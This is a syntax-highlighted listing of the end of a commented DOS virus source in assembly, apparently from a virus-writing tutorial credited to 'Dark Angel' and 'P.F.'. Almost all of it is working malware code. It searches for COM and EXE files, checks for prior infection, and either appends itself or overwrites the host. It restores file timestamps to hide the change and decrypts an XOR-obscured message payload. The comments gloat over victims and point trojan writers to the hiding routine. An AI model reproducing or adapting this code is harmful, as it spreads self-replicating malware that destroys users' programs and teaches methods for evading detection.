          </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">            </span><span class="sc1">;attribute mask - find only normal</span><span class="sc0">
          </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">               </span><span class="sc1">;attributes.</span><span class="sc0">
          </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">open_file</span><span class="sc0">         </span><span class="sc1">;Have we run out of candidates in this</span><span class="sc0">
          </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">                </span><span class="sc1">;directory?  If not go on, else return.</span><span class="sc0">
          </span><span class="sc6">ret</span><span class="sc0">                       </span><span class="sc1">;note: a candidate file matches the file</span><span class="sc0">
                                    </span><span class="sc1">;mask &amp; has normal attributes.</span><span class="sc0">
  </span><span class="sc5">open_file</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3D02h</span><span class="sc0">              </span><span class="sc1">;DOS open file function.</span><span class="sc0">
          </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">dta</span><span class="sc4">+</span><span class="sc2">30</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;get file name out of DTA (put there</span><span class="sc0">
                                         </span><span class="sc1">;for us by the 4eh or 4fh function).</span><span class="sc0">
          </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
          </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3fh</span><span class="sc0">             </span><span class="sc1">;read the first 3 bytes of file &amp; put</span><span class="sc0">
          </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">stuff</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;them in 'stuff' buffer, where we can</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">               </span><span class="sc1">;inspect them for previous infection.</span><span class="sc0">
          </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
          </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                </span><span class="sc1">;is the EXE infector switch thrown?</span><span class="sc0">
          </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">comcheck</span><span class="sc0">      </span><span class="sc1">;if not, use the COM file checker.</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">               </span><span class="sc1">;otherwise, check EXE for infection.</span><span class="sc0">
          </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">4dh</span><span class="sc0">  </span><span class="sc1">;is the first byte of the EXE an 'M'?</span><span class="sc0">
          </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">searchloop</span><span class="sc0">    </span><span class="sc1">;no? then already fucked. Keep looking.</span><span class="sc0">
          </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">infect_file</span><span class="sc0">         </span><span class="sc1">;otherwise let's infect it.</span><span class="sc0">

  </span><span class="sc5">comcheck</span><span class="sc4">:</span><span class="sc0">                                      </span><span class="sc1">;DARK ANGEL'S COMMENTS: </span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">dta</span><span class="sc4">+</span><span class="sc2">26</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;"ax = filesize</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">stuff</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;jmp location</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">eov</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">find_start</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">       </span><span class="sc1">;convert to filesize</span><span class="sc0">
          </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                         </span><span class="sc1">;if same, already infected</span><span class="sc0">
          </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">infect_file</span><span class="sc0">              </span><span class="sc1">;so quit out of here"</span><span class="sc0">
          
  </span><span class="sc5">searchloop</span><span class="sc4">:</span><span class="sc0">                          
          </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">close</span><span class="sc0">               </span><span class="sc1">;close the file.</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4fh</span><span class="sc0">             </span><span class="sc1">;DOS 'find next file' function.</span><span class="sc0">
          </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">tryanother</span><span class="sc0">    </span><span class="sc1">;go back up &amp; try to find new victim.</span><span class="sc0">

  </span><span class="sc5">infect_file</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">dta</span><span class="sc4">+</span><span class="sc2">22</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;Read file date &amp; time</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">dta</span><span class="sc4">+</span><span class="sc2">24</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;stamps from DTA &amp; store</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">                             </span><span class="sc1">;them for retrieval after</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">                             </span><span class="sc1">;infection is complete.</span><span class="sc0">
          </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                          </span><span class="sc1">;branch if this is to be</span><span class="sc0">
          </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">comfect</span><span class="sc0">                  </span><span class="sc1">;a COM infection.  other-</span><span class="sc0">
                                                 </span><span class="sc1">;wise, we now replicate the</span><span class="sc0">
                                                 </span><span class="sc1">;EXE overwriting virus.</span><span class="sc0">
          </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">                         </span><span class="sc1">;go to the beginning of</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">f_ptr</span><span class="sc0">                          </span><span class="sc1">;the file.</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">                        </span><span class="sc1">;write to file function.</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">eov</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">exfect</span><span class="sc0">               </span><span class="sc1">;write EXFECT through EOV   </span><span class="sc0">
          </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">exfect</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;to the EXE file.  [another </span><span class="sc0">
          </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                            </span><span class="sc1">;EXE is now our slave.]</span><span class="sc0">
          </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">finishfect</span><span class="sc0">               </span><span class="sc1">;now, finish up.</span><span class="sc0">
                                               
  </span><span class="sc5">comfect</span><span class="sc4">:</span><span class="sc0">                                       </span><span class="sc1">;COM infection routine.             </span><span class="sc0">
                                                 </span><span class="sc1">;SAYETH DARK ANGEL:</span><span class="sc0">
                                          </span><span class="sc1">;"Calculate the offset of the jmp.</span><span class="sc0">
          </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                          </span><span class="sc1">;ax = filesize - 3"</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">writebuffer</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">  </span><span class="sc1">;store jump offset in buffer.</span><span class="sc0">
          </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">                         </span><span class="sc1">;null AL (write will start</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">f_ptr</span><span class="sc0">                          </span><span class="sc1">;at byte 0 of file.  move</span><span class="sc0">
                                                 </span><span class="sc1">;file pointer there).    </span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">                        </span><span class="sc1">;write to file function.</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                          </span><span class="sc1">;we'll write 3 bytes, namely</span><span class="sc0">
          </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">e9</span><span class="sc4">]</span><span class="sc0">                    </span><span class="sc1">;the contents of E9 buffer.</span><span class="sc0">
          </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                            </span><span class="sc1">;victim file now begins with</span><span class="sc0">
                                                 </span><span class="sc1">;a jump to the viral code!</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                          </span><span class="sc1">;now move file pointer to</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">f_ptr</span><span class="sc0">                          </span><span class="sc1">;the end of the victim file.</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">                        </span><span class="sc1">;write to file again.</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">eov</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">find_start</span><span class="sc0">           </span><span class="sc1">;Namely, write the main</span><span class="sc0">
          </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">find_start</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;viral code.</span><span class="sc0">
          </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                            </span><span class="sc1">;virus is now appended to</span><span class="sc0">
                                                 </span><span class="sc1">;the file.</span><span class="sc0">
  </span><span class="sc5">finishfect</span><span class="sc4">:</span><span class="sc0">                                    </span><span class="sc1">;now to clean up a little.</span><span class="sc0">
          </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">                             </span><span class="sc1">;get old file date/time-</span><span class="sc0">
          </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                             </span><span class="sc1">;stamp off of stack.</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5701h</span><span class="sc0">                      </span><span class="sc1">;DOS set file date/time</span><span class="sc0">
          </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                            </span><span class="sc1">;stamp. (Otherwise, they</span><span class="sc0">
                                                 </span><span class="sc1">;would be left set to date</span><span class="sc0">
                                                 </span><span class="sc1">;&amp; time of infection).</span><span class="sc0">
          </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">                             </span><span class="sc1">;path-searcher will want </span><span class="sc0">
                                                 </span><span class="sc1">;it's old bit pointer back.</span><span class="sc0">
  </span><span class="sc5">close</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3eh</span><span class="sc0">                        </span><span class="sc1">;DOS close file function.</span><span class="sc0">
          </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
          </span><span class="sc6">ret</span><span class="sc0">                                    </span><span class="sc1">;return to CALL_INFECTOR.</span><span class="sc0">

                                               </span><span class="sc1">;end of infection routine.</span><span class="sc0">
          
  </span><span class="sc5">primal</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc3">"НЮХУвЯНЁ тљ ађщэсь Цѕђљ"</span><span class="sc0">     </span><span class="sc1">;an encrypted text            </span><span class="sc0">
          </span><span class="sc1">;string, mainly here to pad appended virus length out to 666 </span><span class="sc0">
          </span><span class="sc1">;bytes.  'Tight Code' purists will shit a brick over this.                 </span><span class="sc0">

  </span><span class="sc1">;the COM infector never uses the PREQUIT routine below.  Only the EXFECT </span><span class="sc0">
  </span><span class="sc1">;routine (which is only used by the EXE overwriting virus, for reasons ex-</span><span class="sc0">
  </span><span class="sc1">;plained in the inset above EXFECT) jumps to it.  It's the EXE infector's </span><span class="sc0">
  </span><span class="sc1">;message payload.  PREQUIT uses a simple encryption/decryption mechanism </span><span class="sc0">
  </span><span class="sc1">;to keep the message hidden from file viewers &amp; such.  It may have been </span><span class="sc0">
  </span><span class="sc1">;better (albeit a bit costlier in speed &amp; bytes) to encrypt the entire </span><span class="sc0">
  </span><span class="sc1">;virus (preferably, with polymorphic capabilities tossed in).  I hope to </span><span class="sc0">
  </span><span class="sc1">;make this mod in my next variant.  But for now, trojan programmers might </span><span class="sc0">
  </span><span class="sc1">;find this routine of interest:</span><span class="sc0">

  </span><span class="sc5">prequit</span><span class="sc4">:</span><span class="sc0">                          
           </span><span class="sc6">lea</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;queue up message to be displayed.</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">204</span><span class="sc0">              </span><span class="sc1">;CX holds length of message.</span><span class="sc0">
  
  </span><span class="sc5">xorloop</span><span class="sc4">:</span><span class="sc0">                            </span><span class="sc1">;loop will decrypt &amp; display message.</span><span class="sc0">
           </span><span class="sc6">lodsb</span><span class="sc0">                      </span><span class="sc1">;load next byte of message into AL.</span><span class="sc0">
           </span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">128</span><span class="sc0">              </span><span class="sc1">;XOR the byte by our key.</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0eh</span><span class="sc0">              </span><span class="sc1">;BIOS 'teletype' write to screen (the</span><span class="sc0">
           </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">10h</span><span class="sc0">                 </span><span class="sc1">;the character is already in AL).</span><span class="sc0">
           </span><span class="sc6">loop</span><span class="sc0">   </span><span class="sc5">xorloop</span><span class="sc0">             </span><span class="sc1">;loop until CX's # of bytes processed.</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4c00h</span><span class="sc0">            </span><span class="sc1">;exit to DOS function, will return   </span><span class="sc0">
           </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">21h</span><span class="sc0">                 </span><span class="sc1">;user to DOS prompt.</span><span class="sc0">

</span><span class="sc1">; Here's the encrypted version of our 'can't execute' message.  Note that</span><span class="sc0">
</span><span class="sc1">; this odd byte pattern may look suspicious to someone in the know using a</span><span class="sc0">
</span><span class="sc1">; file viewer, but then, so would the unencrypted file_masks and "PATH="!</span><span class="sc0">

  </span><span class="sc5">msg</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"    \\[[[[[[[[\\  \[[[[[2[[[[[[[[ ^[2[[[[[[[["</span><span class="sc0">
           </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"[[[[[]   йяѕ усює хјхуѕєх єшщѓ цщьхК ^[[[[[22[[[_"</span><span class="sc0">
           </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"   [    Щєѓ сьђхсфљ фхсфЁ  [[[[[[22[[\\\[_   [["</span><span class="sc0">
           </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"[[22_2[[[[]    __[[22\^2[[[]            22]]]"</span><span class="sc0">

</span><span class="sc1">; D.A. SAYS: "Restore the DTA and return control to the original program</span><span class="sc0">
  </span><span class="sc5">quit</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">             </span><span class="sc1">;Restore current DTA to</span><span class="sc0">
                                      </span><span class="sc1">;the default @ PSP:80h</span><span class="sc0">
  </span><span class="sc5">set_dta</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1ah</span><span class="sc0">             </span><span class="sc1">;Set disk transfer address"</span><span class="sc0">
          </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                 </span><span class="sc1">;so, let it be written,              </span><span class="sc0">
          </span><span class="sc6">ret</span><span class="sc0">                        </span><span class="sc1">;so, let it be done.</span><span class="sc0">

  </span><span class="sc5">f_ptr</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">42h</span><span class="sc0">             </span><span class="sc1">;DOS move file pointer</span><span class="sc0">
          </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">              </span><span class="sc1">;DARK ANGEL:       </span><span class="sc0">
          </span><span class="sc6">cwd</span><span class="sc0">                         </span><span class="sc1">;"equivalent to: xor dx, dx"</span><span class="sc0">
          </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
          </span><span class="sc6">ret</span><span class="sc0">
                           
  </span><span class="sc5">exemask</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"*.EXE"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">;file-mask for EXEs.</span><span class="sc0">
  
  </span><span class="sc1">; All commentary from here down is the DARKANGELMEISTER's.  Hope you found</span><span class="sc0">
  </span><span class="sc1">; the code useful and/or informative.  P.F. signing off...       </span><span class="sc0">
                       
  </span><span class="sc1">; Original three bytes of the infected file</span><span class="sc0">
  </span><span class="sc1">; Currently holds a INT 20h instruction and a null byte </span><span class="sc0">
  </span><span class="sc5">stuff</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0cdh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
  </span><span class="sc5">e9</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0e9h</span><span class="sc0">
  </span><span class="sc5">eov</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">                                      </span><span class="sc1">; End of the virus</span><span class="sc0">
  </span><span class="sc1">; The following variables are stored in the heap space (the area between</span><span class="sc0">
  </span><span class="sc1">; the stack and the code) and are not part of the virus that is written</span><span class="sc0">
  </span><span class="sc1">; to files.</span><span class="sc0">
  </span><span class="sc5">writebuffer</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">                              </span><span class="sc1">; Scratch area holding the</span><span class="sc0">
                                                 </span><span class="sc1">; JMP offset</span><span class="sc0">
  </span><span class="sc5">dta</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">42</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
  </span><span class="sc5">pathstore</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">135</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span></div></body>
</html>
